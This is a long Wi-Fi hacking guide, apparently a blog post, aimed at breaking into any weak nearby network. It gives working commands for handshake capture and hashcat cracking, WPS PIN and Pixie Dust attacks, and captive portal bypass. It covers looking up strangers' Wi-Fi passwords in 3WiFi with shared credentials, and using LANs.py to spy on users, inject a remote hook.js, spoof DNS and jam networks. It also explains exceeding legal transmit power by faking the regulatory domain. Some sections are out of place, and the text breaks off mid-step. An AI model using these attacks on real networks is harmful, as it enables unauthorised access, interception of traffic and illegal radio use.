(miloserdov.org)

**Is it possible to hack Wi-Fi nowadays?**

There are two factors help us:

1. We do not need to hack a specific Wi-Fi network or all networks. It’s enough to find one weak Access Point with an acceptable signal level

2. There are several very effective methods, and if one apply them one by one, then ones will almost certainly be able to find a Wi-Fi network that will succumb

  

**What you need to hack Wi-Fi**

1. You need a sufficient number of wireless networks. If you live on the edge of the village and you have within your reach one Wi-Fi network that you can see, then it is invisible that there are not many chances.The more networks in the area, the better.

2. There are no special hardware requirements, and for some attacks even Wi-Fi adapters that do not support monitor mode are suitable. Nevertheless, I highly recommend adapters with an external antenna, and if the antenna is removable, it is better to buy another bigger one. IMHO, half the ‘skills’ of a Wi-Fi cracker in a large antenna…

  

**How to configured the hardware**

To view the names of the wireless interfaces and their current mode:

adapter in monitor mode / adapter in managed mode

iw dev

To set a Wi-Fi card in monitor mode:

sudo ip link set <INTERFACE> down

sudo iw <INTERFACE> set monitor control

sudo ip link set <INTERFACE> up

If an attack does not need an Internet connection (for some it is necessary), then it is better to stop processes that can interfere (when the first command is executed, the Internet connection will be lost):

sudo systemctl stop NetworkManager

sudo airmon-ng check kill

Return to managed mode:

sudo ip link set <INTERFACE> down

sudo iw <INTERFACE> set type managed

sudo ip link set <INTERFACE> up

Or just unplug and plug in the Wi-Fi adapter – by default, it is always turned on in managed mode.

If you stopped NetworkManager, then to run it:

sudo systemctl start NetworkManager

  

**How to discover hacked wireless Access Points**

This is the easiest method, it does not require wireless mode, but requires an Internet connection.

After the scan is completed, when the seen APs are checked against the database, the Wi-Fi adapter (which performed the scan) is no longer used. That is, while the check is in progress, you can proceed to the next attack.

  

If you have another, non-guest 3WiFi account, then in the script itself, replace the API and remove the line

sleep 15;

  

In this case, the script will not pause between checks.

On Windows, you can use Router Scan by Stas'M to view the BSSID, and then search by 3WiFi. See the article “3WiFi: open database of Wi-Fi Access Points passwords” for details. If I am not mistaken, Router Scan can automatically check the Access Points it sees on the 3WiFi database.

  

---

**Pixie Dust without monitor mode**

This program can only hack passwords from APs with WPS enabled, but monitor mode is not needed. When attacking Pixie Dust, a password can be obtained in seconds.

  

---

**Fast Wi-Fi password brute-force**

Now we will consider the classic method: capture a handshake and brute-force a password. We will speed up and automate the process partly, for this we will use:

- automatic handshake capture for all Access Points within range
    
- two types of brute force with Hashcat are launched: dictionary attack and mask attace in eight digits. This method has a good ratio of time to result
    

We have to set the wireless interface in monitor mode.

  

Run the command to collect handshakes:

sudo besside-ng INTERFACE -W

All handshakes will be saved to the wpa.cap file.

If you are going to hack them all, you can convert all at once to hashcat format using cap2hccapx:

cap2hccapx wpa.cap output.hccapx

If you only need the hash of a specific Access Point, then use the network name (ESSID) as a filter. For example, I’m only interested in the Wi-Fi handshake of the netis56 network and I want to save it in the netis56.hccapx file:

cap2hccapx wpa.cap netis56.hccapx netis56

If you want to split the wpa.cap file into separate handshakes, then use the script from the article “How to extract all handshakes from a capture file with several handshakes”, and then also convert them with cap2hccapx.

Command to launch:

hashcat --force --hwmon-temp-abort=100 -m 2500 -D 1,2 -a 0 'HASH.hccapx' /PATH/TO/rockyou_cleaned.txt

Mandatory options in this command:

- 'HASH.hccapx' – your hccapx file with one or more hashes
    
- /PATH/TO/rockyou_cleaned.txt – path to the dictionary
    
- -m 2500 – the type of hash to be brute-forced
    

Not mandatory options:

- -a 0 is type of attack: dictionary attack. You can skip, because it is implied by default
    
- -D 1,2 means using both the central processor and the video card to crack the password. If you do not specify, most likely only the video card will be selected
    
- --force means to ignore warnings. Without this option, the central processor for cracking passwords is not used. Be careful with this option.
    
- --hwmon-temp-abort=100 – this is the maximum temperature at which brute-force will be forcibly interrupted. I have such a climate that in the daytime the room is always more than +30 ℃, in addition, I run brute-force on the laptop (I do not recommend doing this on laptops!!!), so in my conditions the default barrier of +90 ℃ is reached quickly and brute-force stops. With this option set to a temperature above the default 90, you can actually burn your computer/video card/laptop. Use only at your own risk – I HAVE WARNED YOU!!! Although in practice, temperature reaches 94-96 and then the video card reduces frequencies. So, apparently, it also has its own limit.
    

To launch a mask attack:

hashcat --force --hwmon-temp-abort=100 -m 2500 -D 1,2 -a 3 'HASH.hccapx' ?d?d?d?d?d?d?d?d

New in this command:

- ?d?d?d?d?d?d?d?d is a mask, it means eight digits, it takes about 20 minutes on my hardware to add a larger number of digits to the mask, add ?d.
    
- -a 3 means mask attack.
    

In addition to passwords of 8 digits, passwords of 9-11 digits are also common (the latter are most often mobile phone numbers, so you can specify a mask with fixed digit as 1?d?d?d?d?d?d?d?d?d?d), but each an additional digit increases the brute-force time by 10 times.

  

**Hacking WPS via known PIN and PIN generation algorithms**

In addition to the already discussed Pixie Dust attack, there is another very interesting attack on Access Points with WPS enabled. The fact is that for some models of routers, pins are generated according to certain algorithms, for example, based on the MAC address of the router or its serial number. Knowing this data, one or more pins can be generated, which are highly likely to be suitable for a wireless access point.

Such an attack is implemented in WiFi-autopwner (description here) – in this script an Internet connection is required to request PINs online, but in WiFi-autopwner a fix is implemented for adapters on the Ralink chipset (they are very common among ALFA).

Another similar attack is implemented in airgeddon. But in this program, WPS attacks do not work with adapters based on Ralink chipsets. In this program you need to use, for example, Alfa AWUS036NHA (Atheros chipset). Best  with an Alfa ARS-N19 antenna.

  

---

**Open networks. Bypass Captive Portals**

I have not seen normal open networks for a very long time. But there are enough Captive portals.

Locking system of many of them can be bypassed using the hack-captive-portals program; for details, see the article “Fast and simple method to bypass Captive Portal (hotspot with authorization on the web-interface)”.

As well OpenVPN on the port 53 can be used for this purpose.

  

---

**Wi-Fi Hacking Wireless Adapters**

A good option for beginners is the Alfa AWUS036NHA with the Alfa ARS-N19 antenna. This is generally a very good Wi-Fi adapter for hacking wireless networks, including for attacking WPS. The disadvantage of this card is that it is quite old and does not support modern Wi-Fi protocols.

Donwload script

[https://github.com/systematicat/hack-captive-portals](https://github.com/systematicat/hack-captive-portals)

Run the script

sudo ./hack-captive.sh

If a line appears: Pwned! Now you can surf the Internet!

This means that you can use the Internet access of the interception portal, no other actions are required.

  

**Installation on Kali Linux**

sudo apt -y install sipcalc nmap

wget [https://raw.githubusercontent.com/systematicat/hack-captive-portals/master/hack-captive.sh](https://raw.githubusercontent.com/systematicat/hack-captive-portals/master/hack-captive.sh)

sudo chmod u+x hack-captive.sh

sudo ./hack-captive.sh

  

**Installation on Linux (Debian, Mint, Ubuntu)**

sudo apt update

sudo apt -y install sipcalc nmap

wget [https://raw.githubusercontent.com/systematicat/hack-captive-portals/master/hack-captive.sh](https://raw.githubusercontent.com/systematicat/hack-captive-portals/master/hack-captive.sh)

sudo chmod u+x hack-captive.sh

sudo ./hack-captive.sh

  

To support modern protocols, you can choose Alfa with external antennas from this list.

USB Wi-Fi Adapters with monitor mode and wireless injection (100% compatible with Kali Linux) 2020:

1. Preliminary remarks (‘the best Kali Linux Wi-Fi adapter’)

[https://miloserdov.org/?p=2196#1](https://miloserdov.org/?p=2196#1)

2. Dual Band (2.4GHz & 5.0GHz) Wireless 802.11a/b/g/n/ac USB Adapters

[https://miloserdov.org/?p=2196#2](https://miloserdov.org/?p=2196#2)

3. Dual Band (2.4GHz & 5.0GHz) Wireless 802.11a/b/g/n USB Adapters

[https://miloserdov.org/?p=2196#3](https://miloserdov.org/?p=2196#3)

4. Single Band 2.4GHz Wireless 802.11a/b/g/n USB Adapters

[https://miloserdov.org/?p=2196#4](https://miloserdov.org/?p=2196#4)

5. Built-in Wi-FI adapters for Laptops compatible with Kali Linux

[https://miloserdov.org/?p=2196#5](https://miloserdov.org/?p=2196#5)

6. Outdated adapters but 100% compatible with Kali Linux

[https://miloserdov.org/?p=2196#6](https://miloserdov.org/?p=2196#6)

7. Wi-Fi antennas to gain signal

  

8. Active Extension Cables

  

9. Magnetic Antenna Base

  

---

**3WiFi: open database of Wi-Fi Access Points passwords**

Router Scan program scans the networks and collects information about the routers, including the passwords for Wi-Fi networks.

Members of the Router Scan community share the results of scanning with the 3WiFi service, which places them on a convenient map. Therefore, online you can find information about:

- wireless access points (Wi-Fi) in your area
    
- network names (ESSID)
    
- MAC address of the networks (BSSID)
    
- Wi-Fi network password
    

Usage of 3WiFi is free of any charge. In order to see passwords of Access Points you must log on to the site. For this, you do not need to register.

Limited guest account (only for members of the Router Scan community):

_Login: antichat_

_Password: antichat_

  

**Map of Wi-Fi networks**

[https://miloserdov.org/?goto=28364](https://miloserdov.org/?goto=28364)

On the map, you can find passwords of Wi-Fi networks near you or anywhere in the world. You need to enter the address, alternatively, the name of the object. You will see available information about wireless access points. The data goes in the following order:

- date of adding to the database
    
- MAC Address
    
- network name
    
- network password
    

**Search the Wi-Fi password database**

[https://miloserdov.org/?goto=28365](https://miloserdov.org/?goto=28365)

This page is interface for Free Wireless Database, you can search for access points by:

- BSSID / MAC
    
- ESSID / Name
    
- Wi-Fi Key
    
- WPS PIN
    

In addition, you can use wildcard characters.

  

**Additional 3WiFi tools**

Search IP Ranges by geographical location

[http://3wifi.stascorp.com/ranges](http://3wifi.stascorp.com/ranges)

This tool allows you to search IP ranges by the physical (geographical) location. The comparison is based on the collected data from the geolocation providers.

Therefore, you enter the geographical coordinates, the radius of the search, and get:

- IP Ranges
    
- Network name
    
- Description
    
- Country
    

This is a very useful tool for network researchers who want to scan IP over certain geographical coordinates.

The exact model of the device by MAC address

[http://3wifi.stascorp.com/devmac](http://3wifi.stascorp.com/devmac)

This tool allows you to determine router manufacturer and model by its BSSID / MAC address. The comparison is based on the data collected by Router Scan.

Note that unlike many similar services (like this), not just information about the manufacturer is displayed, detailed information about the model is displayed, and there is probabilistic information about the firmware of devices.

  

**WPS PIN Generator**

[http://3wifi.stascorp.com/wpspin](http://3wifi.stascorp.com/wpspin)

A very useful tool if you want to connect to Wi-Fi when you do not know the password from this network, but the access point supports WPS. This service will help you guess the WPS pin based on the MAC address of the AP.

There are two varieties of the WPS PIN generator:

- Offline WPS PIN Companion from Router Scan (Uses known algorithms, does not use database).
    
- Online 3WiFi WPS PIN generator (Takes advantage of collected data in the database, detects linear sequences, static PIN codes, and other algorithms).
    

  

**How to get 3WiFi to your computer**

You cannot download the 3WiFi database. Attempts to pump out the database will lead to the ban of your account and the ban of all invited by you and further along the chain. No merit will not remove the ban.

However, you can organize your own 3WiFi on your computer or on your server, since the Source code for 3WiFi is hosted on GitHub: [https://github.com/binarymaster/3WiFi](https://github.com/binarymaster/3WiFi)

Therefore, you need a web server, and you also have to scan the ranges you need to have your search information in your 3WiFi database.

  

**Steps for installing 3WiFi:**

1. Copy all required files to your /www directory
    
2. Create database (execute 3wifi.sql to create tables)
    
3. Copy config.php-distr to config.php
    
4. Edit config.php (DB_SERV, DB_NAME, DB_USER, DB_PASS etc)
    
5. (optional) Turn on memory tables (in the config.php define TRY_USE_MEMORY_TABLES as true)
    
6. (optional) Use import.free.php once to import old format database
    
7. Start all background daemons:
    

# Upload routine loads data into database

php -f 3wifid.php uploads

# Finalize routine prepares tasks for finalization

php -f 3wifid.php finalize

# Geolocate routine locates new added BSSIDs on map

php -f 3wifid.php geolocate

# Stats routine caches statistics (use only when stats caching enabled)

php -f 3wifid.php stats

# Memory table manager (use only with memory tables enabled)

php -f 3wifid.php memory

  

**Database maintenance:**

# Recheck not found BSSIDs in the database

php -f 3wifid.php recheck

Before running the daemons, make sure that php-cli interpreter is accessible from your directory.

  

3WiFi is a free database of access points (open source under the Apache 2.0 license) developed by the Router Scan community with the participation of Stas'M Corp.

It stores the access point data that was received as a result scans performed by Router Scan. All data is downloaded to the database voluntarily - either through the website, or directly from Router Scan.

The 3WiFi database is used by the Router Scan community to search for access points, to investigate new vulnerabilities in wireless routers, to detect previously unknown WPS pin-code generation algorithms, to detect routers' mass destruction hotspots (such as substituting SSID name, DNS servers, etc.) , and for many other purposes.

Also 3WiFi base is used by Stas'M Corp. for monitoring, detecting and correcting errors and inaccuracies in real-time scanning results.

The 3WiFi website provides unique services that can be useful to community members:

- View access points on the map
    
- Search for access points by BSSID or name
    
- Search for IP ranges by location
    
- Determine the device model by MAC address
    
- Statistics on various parameters of wireless networks
    

The address of the official 3WiFi database: [http://3wifi.stascorp.com/](http://3wifi.stascorp.com/)

  

---

  

**Router Scan**

[http://stascorp.com/load/1-1-0-56](http://stascorp.com/load/1-1-0-56)

Router Scan is able to find and identify a variety of devices from large number of known routers and that the most important thing is to get from them useful information, in particular the characteristics of the wireless network: a method of protecting the access point (encryption), access point name (SSID) and access point key (passphrase).

Getting information occurs in two possible ways:

The program will try to guess a pair of username/password to the router from a list of standard passwords, thereby get access.

Or the vulnerabilities (bugs) will be used against the router model, allowing to get the necessary information and/or bypass the authorization process.

Wireless network detection and audit were added beginning with the version 2.60 including 802.11a/b/g/n standarts, you will need either an integrated or external Wi-Fi interface to use these functions.

  

3WiFi service functions were also added to achieve best wireless audit results, WPA/WPA2 network key brute-force and WPS PIN audit along with Pixie Dust attack.

  

**Installation on Kali Linux.**

First install Wine:

sudo dpkg --add-architecture i386 && sudo apt update && sudo apt install wine32 winbind

wine --config

Download the archive, unpack it using password

Stas'M Corp

[https://en.kali.tools/?goto=69](https://en.kali.tools/?goto=69)

Run RouterScan.exe using Wine

  

**Installation on Windows**

Download the archive, unpack it using password

Stas'M Corp

Run:

_RouterScan.exe_

  

---

  

**WiFite**

[https://github.com/derv82/wifite2](https://github.com/derv82/wifite2)

To attack multiple WEP, WPA, and WPS encrypted networks in a row. This tool is customizable to be automated with only a few arguments. Wifite aims to be the "set it and forget it" wireless auditing tool.

Features:

- sorts targets by signal strength (in dB); cracks closest access points first
    
- automatically de-authenticates clients of hidden networks to reveal SSIDs
    
- numerous filters to specify exactly what to attack (wep/wpa/both, above certain signal strengths, channels, etc)
    
- customizable settings (timeouts, packets/sec, etc)
    
- "anonymous" feature; changes MAC to a random address before attacking, then changes back when attacks are complete
    
- all captured WPA handshakes are backed up to wifite.py's current directory
    
- smart WPA de-authentication; cycles between all clients and broadcast deauths
    
- stop any attack with Ctrl+C, with options to continue, move onto next target, skip to cracking, or exit
    
- displays session summary at exit; shows any cracked keys
    
- all passwords saved to cracked.txt
    
- built-in updater: ./wifite.py -upgrade
    

  

**WiFite Usage Example**

Attack access points with over 50 dB of power (-pow 50) using the WPS attack (-wps):

wifite -pow 50 -wps

  

**How to install WiFite**

The program is pre-installed on Kali Linux.

Dependences

- Python 2.7.x
    
- airmon-ng
    
- airodump-ng
    
- aireplay-ng
    
- packetforge-ng
    
- aircrack-ng
    
- iwconfig
    
- ifconfig
    
- which
    
- iw
    
- reaver (Wifi-Protected Setup/WPS attack tool)
    
- pyrit (GPU cracker for WPA PSK keys)
    
- tshark (Comes bundled with Wireshark, packet sniffing software)
    
- cowpatty (WPA PSK key cracker. Wifite uses cowpatty, if found, to detect handshakes)
    

  

wget https://raw.github.com/derv82/wifite/master/wifite.py

chmod +x wifite.py

sudo ./wifite.py

  

---

**LANs.py**

[https://github.com/DanMcInerney/LANs.py](https://github.com/DanMcInerney/LANs.py)

LANs.py automatically finds the most active WLAN users then spies on one of them and/or inject arbitrary HTML/JS into pages they visit.

Common usage:

python LANs.py -u -p

  

**Another common usage:**

python LANs.py -u -p -d -ip 192.168.0.10

-d: open an xterm with driftnet to see all images they view

-ip: target this IP address and skip the active targeting at the beginning

  

**HTML injection:**

python LANs.py -b http://192.168.0.5:3000/hook.js

python LANs.py -c '<title>Owned.</title>'

  

**Read from pcap:**

python LANs.py -pcap libpcapfilename -ip 192.168.0.10

  

**DNS spoofing**

python LANs.py -a -r 80.87.128.67

python LANs.py -dns eff.org

  

Example 1: The -a option will spoof every single DNS request the victim makes and when used in conjunction with -r it will redirect them to -r's argument address. The victim will be redirected to [stallman.org](http://stallman.org/) (80.87.128.67) no matter what they type in the address bar.

  

Example 2: This will spoof the domain [eff.org](http://eff.org/) and subdomains of [eff.org](http://eff.org/). When there is no -r argument present with the -a or -dns arguments the script will default to sending the victim to the attacker's IP address. If the victim tries to go to [eff.org](http://eff.org/) they will be redirected to the attacker's IP.

  

**Most aggressive usage:**

python LANs.py -v -d -p -n -na -set -a -r 80.87.128.67 -c '<title>Owned.</title>' -b http://192.168.0.5:3000/hook.js -ip 192.168.0.10

Jam all WiFi networks:

python LANs.py --jam

Jam just one access point (router):

python Lans.py --jam --accesspoint 01:MA:C0:AD:DY

  

**How to install LANs.py on Kali Linux**

sudo apt-get install -y python-nfqueue python-scapy python-twisted nbtscan

git clone https://github.com/DanMcInerney/LANs.py.git

cd LANs.py/

sudo ./LANs.py --help

  

---

**Aircrack-ng (Suite of Tools)**

[http://aircrack-ng.org/](http://aircrack-ng.org/)

Aircrack-ng is a complete suite of tools to assess WiFi network security.

It focuses on different areas of WiFi security:

- Monitoring: Packet capture and export of data to text files for further processing by third party tools.
    
- Attacking: Replay attacks, deauthentication, fake access points and others via packet injection.
    
- Testing: Checking WiFi cards and driver capabilities (capture and injection).
    
- Cracking: WEP and WPA PSK (WPA 1 and 2).
    

  

Tools included in the aircrack-ng package

- airbase-ng – Configure fake access points
    
- aircrack-ng – Wireless password cracker
    
- airdecap-ng – Decrypt WEP/WPA/WPA2 capture files
    
- airdecloak-ng – Removes wep cloaking from a pcap file
    
- airdriver-ng – Provides status information about the wireless drivers on your system
    
- aireplay-ng – Primary function is to generate traffic for the later use in aircrack-ng
    
- airmon-ng – This script can be used to enable monitor mode on wireless interfaces
    
- airmon-zc – This script can be used to enable monitor mode on wireless interfaces
    
- airodump-ng – Used for packet capturing of raw 802.11 frames
    
- airodump-ng-oui-update – Downloads and parses IEEE OUI list
    
- airolib-ng – Designed to store and manage essid and password lists
    
- airserv-ng – A wireless card server
    
- airtun-ng – Virtual tunnel interface creator
    
- besside-ng – Automatically crack WEP & WPA network
    
- besside-ng-crawler – filter EAPOL frames from a directory of a capture files
    
- buddy-ng – a tool to work with easside-ng
    
- easside-ng – An auto-magic tool which allows you to communicate via an WEP-encrypted access point
    
- ivstools – This tool handle .ivs files. You can either merge or convert them
    
- kstats – show statistical FMS algorithm votes for an ivs dump and a specified WEP key
    
- makeivs-ng – Generates initialization vectors
    
- packetforge-ng – Create encrypted packets that can subsequently be used for injection
    
- tkiptun-ng – This tool is able to inject a few frames into a WPA TKIP network with QoS
    
- wesside-ng – Auto-magic tool which incorporates a number of techniques to seamlessly obtain a WEP key
    
- wpaclean – Remove excess data from a pcap file
    

  

**How to install Aircrack-ng**

From repository:

sudo apt-get install aircrack-ng

Installation the newest version Aircrack-ng from source:

sudo apt remove aircrack-ng

sudo apt install autoconf automake libpcre3-dev libnl-3-dev libsqlite3-dev libssl-dev ethtool build-essential g++ libnl-genl-3-dev libgcrypt20-dev libtool

sudo apt install -y pkg-config

git clone https://github.com/aircrack-ng/aircrack-ng.git

cd aircrack-ng/

autoreconf -i

./configure --with-experimental --with-ext-scripts

make

sudo make install

sudo airodump-ng-oui-update

  

---

**Pyrit**

[https://github.com/JPaulMora/Pyrit](https://github.com/JPaulMora/Pyrit)

Pyrit allows you to create massive databases of pre-computed WPA/WPA2-PSK authentication phase in a space-time-tradeoff. By using the computational power of Multi-Core CPUs and other platforms through ATI-Stream,Nvidia CUDA and OpenCL, it is currently by far the most powerful attack against one of the world’s most used security-protocols.

  

**Usage Example**

The benchmark option computes and displays your systems cracking speed:

pyrit benchmark

Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora

https://github.com/JPaulMora/Pyrit

This code is distributed under the GNU General Public License v3+

Running benchmark (1353.0 PMKs/s)... /

Computed 1352.97 PMKs/s total.

#1: 'CPU-Core (SSE2/AES)': 464.7 PMKs/s (RTT 2.9)

#2: 'CPU-Core (SSE2/AES)': 91.4 PMKs/s (RTT 10.3)

#3: 'CPU-Core (SSE2/AES)': 742.3 PMKs/s (RTT 2.5)

#4: 'CPU-Core (SSE2/AES)': 498.4 PMKs/s (RTT 3.6)

  

Read a capture file (/usr/share/doc/aircrack-ng/examples/wpa2.eapol.cap) and analyze it (analyze):

pyrit -r /usr/share/doc/aircrack-ng/examples/wpa2.eapol.cap analyze

Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora

https://github.com/JPaulMora/Pyrit

This code is distributed under the GNU General Public License v3+

  

Parsing file '/usr/share/doc/aircrack-ng/examples/wpa2.eapol.cap' (1/1)...

Parsed 5 packets (5 802.11-packets), got 1 AP(s)

  

#1: AccessPoint 00:14:6c:7e:40:80 ('Harkonen'):

#1: Station 00:13:46:fe:32:0c, 1 handshake(s):

#1: HMAC_SHA1_AES, good, spread 1

  

Create an ESSID (create_essid), specifying the name found in the above analysis (-e Harkonen):

pyrit -e Harkonen create_essid

Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora

https://github.com/JPaulMora/Pyrit

This code is distributed under the GNU General Public License v3+

  

Connecting to storage at 'file://'... connected.

Created ESSID 'Harkonen'

  

Read a password file (-i /usr/share/wordlists/metasploit/password.lst) and import them into the database (import_passwords):

pyrit -i /usr/share/wordlists/metasploit/password.lst import_passwords

Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora

https://github.com/JPaulMora/Pyrit

This code is distributed under the GNU General Public License v3+

  

Connecting to storage at 'file://'... connected.

88396 lines read. Flushing buffers....

All done.

  

Compute the PMKs using the ESSID and passwords (batch):

pyrit batch

Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora

https://github.com/JPaulMora/Pyrit

This code is distributed under the GNU General Public License v3+

  

Connecting to storage at 'file://'... connected.

Working on ESSID 'Harkonen'

Processed all workunits for ESSID 'Harkonen'; 1756 PMKs per second.

  

Batchprocessing done.

  

Read the capture file (-r /usr/share/doc/aircrack-ng/examples/wpa2.eapol.cap) and attempt to crack the password (attack_db).

pyrit -r /usr/share/doc/aircrack-ng/examples/wpa2.eapol.cap attack_db

Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora

https://github.com/JPaulMora/Pyrit

This code is distributed under the GNU General Public License v3+

  

Connecting to storage at 'file://'... connected.

Parsing file '/usr/share/doc/aircrack-ng/examples/wpa2.eapol.cap' (1/1)...

Parsed 5 packets (5 802.11-packets), got 1 AP(s)

  

Picked AccessPoint 00:14:6c:7e:40:80 ('Harkonen') automatically.

Attacking handshake with Station 00:13:46:fe:32:0c...

Tried 15877 PMKs so far (33.2%); 9788764 PMKs per second.

  

The password is '12345678'.

  

---

**WiFi-autopwner**

[https://miloserdov.org/?p=35](https://miloserdov.org/?p=35)

WiFi-autopwner is an assistant for performing attacks on a Wi-Fi network and collecting information.

The script can:

- switch the wireless interface to different modes and increase the transmit power of the Wi-Fi adapter
    
- perform WPS attacks using the built-in fix for Reaver error "Errors: WARNING: Failed to associate with"
    
- perform automated Pixie Dust attacks against all APs with WPS
    
- perform known PIN attack with the most probable WPS PINs on one or all APs at once
    
- reveal a WPA-PSK password when the WPS PIN is known
    
- grab handshakes of all or individual AP with the launch of a subsequent brut-force
    
- automated query 3WIFI of all access points in range of reach
    
- show all Access Points and Clients in the District
    
- perform a basic information gathering in a local network by scanning hosts with Nmap and automatically checking a router for vulnerabilities using RouterSploit
    
- bypass Captive Portal (using the improved hack-captive-portals script)
    
- automated WEP attacks on all APs
    
- search for open AP
    
- connect to Access Points
    
- create an Access Point
    
- perform automatic security auditing of Wi-Fi networks using these attacks
    

  

**Usage Example**

Launching an attack with the most likely PINs on all APs with WPS

This attack requires an Internet connection to download PINs. This internet connection can be accessed by wire or by a second Wi-Fi adapter.

Go to the directory with the program and run it:

cd WiFi-autopwner/

sudo bash wifi-autopwner.sh

Go to the choice of network interfaces and choose one of them:

Set the interface into monitor mode:

We launch the attack:

We are waiting for the completion of the attack:

Hacked passwords are displayed on the screen and saved in the all_wifi_passwords.txt file:

  

**How to install WiFi-autopwner**

The program is a Bash script that should work in any Linux distribution, if necessary dependencies are installed. Not all dependencies are strictly mandatory - if you do not use all functions of the script, then some of the dependencies you will not need. A complete list of programs that the WiFi-autopwner uses during its operation:

- package aircrack-ng (it uses the programs Aircrack-ng, Airodump-ng, Besside-ng, Airmon-ng)
    
- Reaver
    
- PixieWPS
    
- Wireshark
    
- Nmap
    
- RouterSploit
    
- Hashcat
    
- crunch
    
- sipcalc
    
- wireless-regdb
    
- crda
    
- iw
    
- wpasupplicant
    
- create_ap
    
- xterm
    
- git
    

  

**Installation on Kali Linux**

sudo apt install reaver aircrack-ng pixiewps wireshark-qt nmap routersploit crunch sipcalc wireless-regdb crda iw wpasupplicant xterm git

git clone https://github.com/Mi-Al/WiFi-autopwner.git

cd WiFi-autopwner/

sudo bash wifi-autopwner.sh

If you want to use Hashcat for cracking passwords, then you need to install the necessary drivers. For example, if you have a video card nVidia, then install the drivers and programs:

echo -e "blacklist nouveau\noptions nouveau modeset=0\nalias nouveau off" > /etc/modprobe.d/blacklist-nouveau.conf

update-initramfs -u && reboot

apt install -y ocl-icd-libopencl1 nvidia-driver nvidia-cuda-toolkit

If you need the function of creating a wireless access point, then install the create_ap program:

sudo apt install haveged hostapd git util-linux procps iproute2 iw dnsmasq iptables

git clone https://github.com/oblique/create_ap

cd create_ap

sudo make install

cd .. && rm -rf create_ap

  

---

**WiFi-autopwner 2**

A new version of WiFi-autopwner 2 is released in which many new features. Some of them are quite interesting. We will pass on innovations, and also we will learn how to use them.

New features:

- TX-Power increase of Wi-Fi adapter
    
- Connecting to wireless networks and creating an Access Point
    
- Bypassing the interception portal (Captive Portal)
    
- Collecting information about the local network, automatically checking the router for vulnerabilities
    
- Attack with the most likely PINs
    
- Automatic capture handshakes of all access points and launch Brut-force
    
- Show all Access Points and Clients in the District
    
- Automatic check of all Access Points on the 3WiFi base
    
- Store cracked passwords in a file
    

  

There are ideas in the next versions to separate most of the hard-coded settings to the settings file and add the ability to change them through the program interface so that users can set themselves, for example, timeouts.

  

To speed up the automated Pixie Dust attack against all access points, control over running processes will be added and obviously unpromising attacks will stop immediately to move quickly to the next. By the way, if you sit in front of the monitor and watch the program is working, then when Pixie Dust attack is performing if one of the windows is closed, then the attack will definitely not bring results. Therefore, close the second window, so that the transition to the next AP occurs more quickly.

  

Algorithms for generating PINs, as well as a database of known PINs, are supposed to be taken from airgeddon.

  

---

**TX-Power of Wi-Fi adapters**

The default TX-Power of wireless is set to 20 dBm but you can increase it with a little trick to 30 dBm but let me warn you first that it might be illegal in your country, so use it at your own risk. Moreover some models will not support these settings or wireless chip may state that it "can" transmit with higher power, but the device's manufacturer probably did not place the appropriate heat sink in order to accomplish this.

  

In different countries, legislation and technical standards varies, including in relation to Wi-Fi. In some countries it is not allowed to use the frequencies of some Wi-Fi channels (for example, channels 12, 13 and 14 can not be used in the USA). In most countries, a Wi-Fi signal power limit of 20.0 dBm is set. But there are countries in which there is a limitation of 30.0 dBm. You can take advantage of this loophole (make your wireless thinks it is located in a country where 30.0 dBm is allowed) and raise its TX Power to a value of 30.0 dBm.

  

Regulatory domains (or "regdomain") is the country in which this device is supposed to work. There is also an accompanying database, in which are prescribed the permitted frequencies and the allowed power.

  

The algorithm is:

- set the system-wide setting of the regulatory domain to the value, that matches to a country where the power is allowed to be 30.0 dBm;
    
- set the increased power for the wireless adapter.
    

In theory, the described method should work for many wireless cards, but in practice there are the following limitations:

- the physical inability of an adapter to operate at capacities greater than 20.0 dBm (for example, the wireless interface initially shows a power of 15.0 dBm while 20.0 dBm is allowed. In this case it is impossible to raise the power above 15.0 dBm, even to 20.0 dBm);
    
- driver features, for example, some drivers ignore system settings. This is not an insoluble problem, but each model needs its own approach.
    

To check capabilities of your wireless adapter issue the command:

sudo iw list

For example, the following frequencies and power are allowed for the US:

<image>

You can examine the full current database in pain text here.

Countries where allowed channels 1 through 13 on 30.0 dBm power are (for instance):

- BZ
    
- GY
    
- NZ
    
- VE
    

Note that for channels at 5 GHz they have different values (different list of allowed frequencies and powers).

  

Next, I'll show the power increasing of Alfa AWUS052NH in Kali Linux. The old guides tell to install additional packages, but currently this is not necessary. Everything you need is already available in Kali Linux!

  

To find out which region is currently configured, run the command:

sudo iw reg get

The string country 00 indicates that I have not set any value and the default settings was applied.

  

Now set the regulatory domains to BZ:

sudo iw reg set BZ

To insure the setting was applied run the command:

sudo iw reg get

At the same time, you can look at the new features with the command:

sudo iw list

To view the name of the wireless interface and its current status, use the command:

sudo iw dev

Next, increase the power (replace wlan0 with the actual name of your wireless interface):

sudo ip link set wlan0 down

sudo iw dev wlan0 set txpower fixed 30mBm

# sudo iw wlan0 set monitor control # if monitor mode needed

sudo ip link set wlan0 up

Checking:

sudo iw dev

  

**How to increase TX-Power of Alfa AWUS036NHA**

The above commands have no effect for AWUS036NHA. The driver of this adapter ignores regulatory domain value.

If you have Alfa AWUS036NHA or any other that ignores settings of regulatory domain, this is no reason to give up.

We are able to change database of the world regulatory domain.

First let's check which country your wireless card is made for:

sudo iw reg get

In my case, the country GB line indicates that the adaptor was produced for the country that is named GB in the database.

  

My method differs from other tutorials, where the wireless-regdb and crda packages are manually installed. These packages should already be installed on your system (in Kali Linux is the default). The only thing we do is replace the database file.

  

Install the dependency required to compile the database:

sudo apt install python-m2crypto python3-m2crypto

We clone the source files:

git clone git://git.kernel.org/pub/scm/linux/kernel/git/sforshee/wireless-regdb.git

cd wireless-regdb/

Now we need to edit the database file:

gedit db.txt

In the file, find the country 00 line and replace line after it with something like that (correct it up to you):

(2402 - 2482 @ 40), (30)

(5170 - 5835 @ 80), (30)

(57000 - 66000 @ 2160), (40)

Now I find and change the lines according to the country wireless made for, for me it is GB:

Save and close the file.

  

Execute the command:

make

As a result, a binary file of the database (regulatory.bin) was created from the text file. We will use it to replace the file with the same name in the system.

Delete the original database file:

sudo rm /lib/crda/regulatory.bin

We copy our modified database:

sudo cp regulatory.bin /lib/crda/regulatory.bin

We copy the required public key (the database file is signed with a specially generated key for our user):

